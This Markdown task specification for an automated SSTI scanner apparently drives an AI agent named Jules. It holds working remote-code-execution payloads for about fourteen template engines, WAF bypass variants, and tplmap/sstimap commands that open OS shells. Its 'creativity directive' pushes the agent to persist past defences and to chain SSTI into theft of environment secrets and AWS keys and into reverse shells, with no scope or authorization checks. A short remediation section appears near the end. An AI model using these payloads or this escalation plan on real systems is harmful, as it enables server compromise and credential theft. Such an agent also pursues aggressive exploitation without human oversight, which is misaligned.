# Task 48: SSTI (Server-Side Template Injection) Scanner
# ==============================================================================
# JULES AI AGENT INSTRUCTIONS - FULL BRAIN MODE
# ==============================================================================

## TASK IDENTITY
- **Task Number**: 48
- **Task Name**: SSTI Scanner â†’ RCE
- **Category**: Phase 4 - Injection Testing (Step 13)
- **Depends On**: Task 32 (WAF detection), Task 35 (Tech detection)
- **AI Brain**: ssti_scanner.py

## PURPOSE
Detect Server-Side Template Injection vulnerabilities that lead to RCE.
Uses Tplmap, SSTImap, and TInjA with engine-specific payloads.

SSTI is HIGH IMPACT - successful exploitation = full RCE on server.

## INPUT FILES

```
PRIMARY (parameterized URLs):
â”œâ”€â”€ outputs/queue_dynamic_endpoints_urls.txt   # Dynamic URLs (Task 22)
â”œâ”€â”€ outputs/arjun_found_params.txt             # Hidden params (Task 34)
â”œâ”€â”€ outputs/api_endpoints_live.txt             # API endpoints (Task 38)
â”œâ”€â”€ outputs/queue_api_endpoints_kiterunner.txt # Kiterunner routes

INTELLIGENCE:
â”œâ”€â”€ outputs/waf/waf_results.json               # WAF type (Task 32)
â”œâ”€â”€ outputs/nuclei/tech_stack.json             # Tech stack (Task 35)

HAR-DERIVED:
â”œâ”€â”€ outputs/har/common_data.txt                # HAR endpoints
```

## OUTPUT FILES

```
outputs/ssti/
â”œâ”€â”€ ssti_vulnerable.txt           # Confirmed SSTI vulns
â”œâ”€â”€ ssti_possible.txt             # Heuristic matches (need manual)
â”œâ”€â”€ ssti_results.json             # Full scan results
â”œâ”€â”€ engine_detected.txt           # Detected template engines

outputs/vulnerabilities/
â”œâ”€â”€ SSTI-{engine}-{hash}-CRITICAL.md
```

## TEMPLATE ENGINES & DETECTION

### Engine Identification Polyglots

```
Primary polyglot (tests multiple engines):
${{<%[%'"}}%\.

Response analysis:
- If "49" appears â†’ Twig, Jinja2, or similar (7*7 evaluated)
- If "${{7*7}}" reflected as-is â†’ No SSTI
- If error with template syntax â†’ Engine revealed in error
```

### Engine-Specific Probes

```yaml
jinja2:  # Python (Flask, Django)
  detect: "{{7*7}}"
  confirm: "{{config}}"
  rce: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

twig:  # PHP (Symfony)
  detect: "{{7*7}}"
  confirm: "{{_self.env.display}}"
  rce: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

freemarker:  # Java
  detect: "${7*7}"
  confirm: "${.version}"
  rce: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

velocity:  # Java (Apache)
  detect: "#set($x=7*7)$x"
  confirm: "$class.inspect"
  rce: "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id'))"

thymeleaf:  # Java (Spring)
  detect: "[[${7*7}]]"
  confirm: "[[${T(java.lang.System).getenv()}]]"
  rce: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"

mako:  # Python
  detect: "${7*7}"
  rce: "<%import os%>${os.popen('id').read()}"

smarty:  # PHP
  detect: "{7*7}"
  confirm: "{$smarty.version}"
  rce: "{system('id')}"

pebble:  # Java
  detect: "{{7*7}}"
  rce: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}"

erb:  # Ruby (Rails)
  detect: "<%= 7*7 %>"
  rce: "<%= system('id') %>"

handlebars:  # JavaScript
  detect: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}"

ejs:  # JavaScript (Node.js)
  detect: "<%= 7*7 %>"
  rce: "<%= global.process.mainModule.require('child_process').execSync('id') %>"

nunjucks:  # JavaScript
  detect: "{{7*7}}"
  rce: "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"

tornado:  # Python
  detect: "{{7*7}}"
  rce: "{% import os %}{{os.popen('id').read()}}"

jade/pug:  # JavaScript
  detect: "#{7*7}"
  rce: "#{global.process.mainModule.require('child_process').execSync('id')}"
```

## SSTI-LIKELY PARAMETERS

```python
# Parameters commonly processed by template engines
SSTI_PARAMS = {
    'high_priority': [
        'template', 'tmpl', 'tpl', 'view', 'layout', 'theme',
        'skin', 'preview', 'render', 'format', 'content',
        'message', 'msg', 'text', 'body', 'subject', 'title',
        'name', 'email', 'username', 'comment', 'bio',
        'description', 'summary', 'review', 'feedback',
    ],
    'medium_priority': [
        'q', 'query', 'search', 's', 'keyword',
        'page', 'doc', 'article', 'post',
        'data', 'input', 'value', 'field',
        'error', 'debug', 'display',
    ],
    'email_context': [  # Email templates often vulnerable
        'to', 'from', 'cc', 'bcc', 'reply',
        'subject', 'body', 'signature',
    ],
    'pdf_context': [  # PDF generation often uses templates
        'html', 'content', 'template', 'header', 'footer',
    ]
}
```

## TOOLS

### 1. Tplmap (Primary)

```bash
# Basic scan
tplmap -u "http://target/?param=test"

# POST data
tplmap -u "http://target/" -d "param=test"

# With cookies
tplmap -u "http://target/?param=test" --cookie "session=abc123"

# Force engine
tplmap -u "http://target/?param=test" --engine jinja2

# OS command execution (if vulnerable)
tplmap -u "http://target/?param=test" --os-cmd "id"

# Interactive shell
tplmap -u "http://target/?param=test" --os-shell
```

### 2. SSTImap (Secondary)

```bash
# Basic scan
sstimap -u "http://target/?param=test"

# POST request
sstimap -u "http://target/" -d "param=test"

# JSON body
sstimap -u "http://target/" --data '{"param":"test"}' --json

# All parameters
sstimap -u "http://target/?a=1&b=2" --crawl

# Execute command
sstimap -u "http://target/?param=test" --os-cmd "id"
```

### 3. TInjA (Hackmanit)

```bash
# Scan URL
tinja url -u "http://target/?param=test"

# With request file
tinja request -r request.txt

# Polyglot mode
tinja url -u "http://target/?param=test" --polyglots
```

## AI BRAIN LOGIC

```
1. LOAD TARGETS
   â”œâ”€â”€ Collect parameterized URLs from all sources
   â”œâ”€â”€ Load WAF info (bypass selection)
   â””â”€â”€ Load tech stack (engine hints)

2. PRIORITIZE PARAMETERS
   â”œâ”€â”€ High: template, preview, render, message, etc.
   â”œâ”€â”€ Medium: search, query, content, etc.
   â””â”€â”€ Deprioritize: id, page, sort

3. DETERMINE LIKELY ENGINE FROM TECH STACK
   â”œâ”€â”€ Python (Flask/Django) â†’ Jinja2
   â”œâ”€â”€ PHP (Symfony/Laravel) â†’ Twig/Blade
   â”œâ”€â”€ Java (Spring) â†’ Thymeleaf/Freemarker
   â”œâ”€â”€ Ruby (Rails) â†’ ERB
   â”œâ”€â”€ Node.js â†’ EJS/Nunjucks/Pug
   â””â”€â”€ Unknown â†’ Test all

4. FOR EACH TARGET:
   a. Send universal polyglot: ${{<%[%'"}}%\.
   b. Analyze response for engine hints
   c. If promising â†’ Run Tplmap with engine hint
   d. If Tplmap fails â†’ Try SSTImap
   e. If both fail but suspicious â†’ Try TInjA

5. CONFIRM EXPLOITATION
   â”œâ”€â”€ Attempt OS command execution
   â”œâ”€â”€ If RCE works â†’ CRITICAL finding
   â””â”€â”€ Document engine and payload

6. OUTPUT RESULTS
   â”œâ”€â”€ ssti_vulnerable.txt (confirmed)
   â”œâ”€â”€ ssti_possible.txt (need manual)
   â””â”€â”€ Vulnerability reports
```

## WAF BYPASS TECHNIQUES

```yaml
# Common SSTI WAF bypasses

jinja2_bypass:
  # Attribute access alternatives
  - "{{request['__class__']}}"
  - "{{request|attr('__class__')}}"
  - "{{request.__getattribute__('__class__')}}"
  
  # String concatenation
  - "{{''['__cla'+'ss__']}}"
  - "{%set a='__cla'%}{%set b='ss__'%}{{''[a+b]}}"
  
  # Unicode bypass
  - "{{''['\u005f\u005fclass\u005f\u005f']}}"
  
  # Filter bypass
  - "{{lipsum.__globals__}}"
  - "{{cycler.__init__.__globals__}}"
  - "{{joiner.__init__.__globals__}}"

twig_bypass:
  # Alternative syntax
  - "{{['id']|filter('system')}}"
  - "{{['id']|map('system')}}"
  - "{{{'id':'id'}|filter('system')}}"

freemarker_bypass:
  # Alternative execute
  - "${'freemarker.template.utility.Execute'?new()('id')}"
  - "[#assign ex='freemarker.template.utility.Execute'?new()][=ex('id')]"

generic:
  # URL encoding
  - "%7b%7b7*7%7d%7d"
  # Double encoding
  - "%257b%257b7*7%257d%257d"
  # Unicode
  - "\u007b\u007b7*7\u007d\u007d"
```

## VULNERABILITY REPORT TEMPLATE

```markdown
# SSTI Vulnerability: SSTI-{engine}-{hash}

## Summary
| Field | Value |
|-------|-------|
| **ID** | SSTI-{engine}-{hash} |
| **URL** | {url} |
| **Parameter** | {param} |
| **Template Engine** | {engine} |
| **RCE Confirmed** | Yes/No |
| **Severity** | CRITICAL |

## Detection
```
Polyglot: ${{<%[%'"}}%\.
Response indicated {engine} template processing
```

## Exploitation Payload
```
{payload}
```

## Command Output
```
{command_output}
```

## Impact
- **Severity**: CRITICAL
- Full Remote Code Execution on server
- Read/write arbitrary files
- Access to environment variables and secrets
- Lateral movement to internal systems
- Complete server compromise

## Remediation
1. **Never pass user input to template rendering**
2. Use logic-less templates (Mustache) where possible
3. Sandbox template execution
4. Whitelist allowed template variables
5. Escape all user input before rendering

## References
- [PortSwigger SSTI](https://portswigger.net/research/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
```

## EXECUTION FLOW

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  1. Collect parameterized URLs          â”‚
â”‚     - Dynamic endpoints                 â”‚
â”‚     - Hidden params (Arjun)             â”‚
â”‚     - API endpoints                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  2. Load intelligence:                  â”‚
â”‚     - WAF type â†’ bypass selection       â”‚
â”‚     - Tech stack â†’ engine hints         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  3. For each URL:                       â”‚
â”‚     a. Send polyglot probe              â”‚
â”‚     b. Analyze for engine signature     â”‚
â”‚     c. Run Tplmap/SSTImap               â”‚
â”‚     d. Attempt RCE if vulnerable        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚
                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  4. Output:                             â”‚
â”‚     - ssti_vulnerable.txt               â”‚
â”‚     - SSTI-{engine}-*.md reports        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## HOW TO RUN

```bash
# Full SSTI scan
python ssti_scanner.py --workspace d:\wallet\Mylab

# Specific URL
python ssti_scanner.py --workspace d:\wallet\Mylab --url "http://target/?template=test"

# Force specific engine
python ssti_scanner.py --workspace d:\wallet\Mylab --engine jinja2

# Resume from checkpoint
python ssti_scanner.py --workspace d:\wallet\Mylab --resume

# Skip RCE confirmation (detection only)
python ssti_scanner.py --workspace d:\wallet\Mylab --no-exploit
```

## AI AGENT CREATIVITY DIRECTIVE

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  The documented payloads are starting points - USE YOUR BRAIN!      â”‚
â”‚                                                                     â”‚
â”‚  âœ“ If standard payloads blocked â†’ try WAF bypass variants          â”‚
â”‚  âœ“ Observe error messages â†’ they reveal engine and filter info     â”‚
â”‚  âœ“ Chain encoding: URL + Unicode + HTML entities                   â”‚
â”‚  âœ“ Try context-specific payloads (email, PDF, error pages)         â”‚
â”‚  âœ“ Look for second-order SSTI (stored â†’ rendered elsewhere)        â”‚
â”‚  âœ“ Test alternative injection points (headers, cookies, JSON)      â”‚
â”‚  âœ“ Research new bypass techniques if standard ones fail            â”‚
â”‚                                                                     â”‚
â”‚  SSTI = RCE. Don't give up easily - this is a CRITICAL finding!    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Think Like an Attacker

```yaml
observe:
  - What characters cause errors? (reveals engine)
  - What's in error messages? (stack traces reveal engine)
  - Does {{7*7}} return 49? (math evaluation = SSTI)
  - Does ${7*7} return 49? (different syntax)

adapt:
  - If {{}} blocked â†’ try ${}, #{}, <%%>, [[]]
  - If "config" blocked â†’ try attribute access tricks
  - If "__" blocked â†’ try string concatenation
  - If direct RCE blocked â†’ try file read first

chain:
  - SSTI â†’ Environment variable leak â†’ AWS keys
  - SSTI â†’ File read â†’ Source code â†’ More vulns
  - SSTI â†’ RCE â†’ Reverse shell â†’ Full compromise
```

## CONTEXT-SPECIFIC TESTING

```yaml
email_templates:
  - Often render user input (name, subject)
  - Test: registration confirmations, password resets
  - Payload in: name field, email subject

pdf_generation:
  - HTML-to-PDF often uses templates
  - Test: invoice generation, report export
  - Payload in: content fields

error_pages:
  - Custom error pages may render input
  - Test: 404 pages, search no-results
  - Payload in: URL path, query string

preview_features:
  - "Preview" functionality often renders templates
  - Test: email preview, document preview
  - Payload in: preview content

admin_panels:
  - Admin template editors = direct SSTI
  - Test: email template config, page builders
```

## COMMON MISTAKES TO AVOID

```
1. DON'T just test obvious params - test ALL params
2. DON'T give up after one tool fails - try multiple
3. DON'T ignore error messages - they reveal the engine
4. DON'T forget POST body, JSON, headers as injection points
5. DON'T skip encoded payloads when WAF present
```

## AI AGENT CREATIVITY DIRECTIVE

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ SSTI is subtle. Automated tools miss it often. Use your INTELLIGENCE.       â”‚
â”‚                                                                             â”‚
â”‚ IDENTIFY THE ENGINE FIRST:                                                  â”‚
â”‚                                                                             â”‚
â”‚ 1. Send polyglot: ${{<%[%'"}}%\.                                            â”‚
â”‚ 2. OBSERVE the response carefully:                                          â”‚
â”‚    - "49" appears? â†’ Mathematical evaluation works (Jinja2, Twig)           â”‚
â”‚    - Error message? â†’ READ IT - it names the engine!                        â”‚
â”‚    - Reflected as-is? â†’ No SSTI, move on                                    â”‚
â”‚                                                                             â”‚
â”‚ THINK ABOUT WHERE TEMPLATES ARE USED:                                       â”‚
â”‚                                                                             â”‚
â”‚ â€¢ Email templates â†’ Your name in "Dear {{name}}" emails                     â”‚
â”‚ â€¢ Error pages â†’ "Page {{url}} not found"                                    â”‚
â”‚ â€¢ PDF generation â†’ Invoice with user-provided content                       â”‚
â”‚ â€¢ Preview features â†’ "Preview your message" functionality                   â”‚
â”‚ â€¢ Admin panels â†’ Template editors are goldmines                             â”‚
â”‚                                                                             â”‚
â”‚ ADAPT TO THE ENGINE:                                                        â”‚
â”‚                                                                             â”‚
â”‚ Once you identify the engine, use ENGINE-SPECIFIC payloads:                 â”‚
â”‚ â€¢ Jinja2 â†’ {{config.__class__.__init__.__globals__['os'].popen('id')}}     â”‚
â”‚ â€¢ Twig â†’ {{_self.env.registerUndefinedFilterCallback('exec')}}             â”‚
â”‚ â€¢ Freemarker â†’ ${"freemarker.template.utility.Execute"?new()("id")}        â”‚
â”‚ â€¢ Velocity â†’ #set($x=$rt.getRuntime().exec("id"))                          â”‚
â”‚                                                                             â”‚
â”‚ ESCALATE PROGRESSIVELY:                                                     â”‚
â”‚                                                                             â”‚
â”‚ 1. Confirm SSTI: {{7*7}} â†’ see "49"?                                        â”‚
â”‚ 2. Read config: {{config}} or {{settings}}                                  â”‚
â”‚ 3. List methods: {{"".__class__.__mro__}}                                   â”‚
â”‚ 4. Find os module: navigate MRO to find subprocess/os                       â”‚
â”‚ 5. Execute command: call popen/system                                       â”‚
â”‚                                                                             â”‚
â”‚ CHAIN YOUR FINDINGS:                                                        â”‚
â”‚ â€¢ SSTI â†’ Environment variables â†’ AWS keys, DB passwords                     â”‚
â”‚ â€¢ SSTI â†’ File read â†’ Source code â†’ More vulnerabilities                     â”‚
â”‚ â€¢ SSTI â†’ RCE â†’ Reverse shell â†’ Full server compromise                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
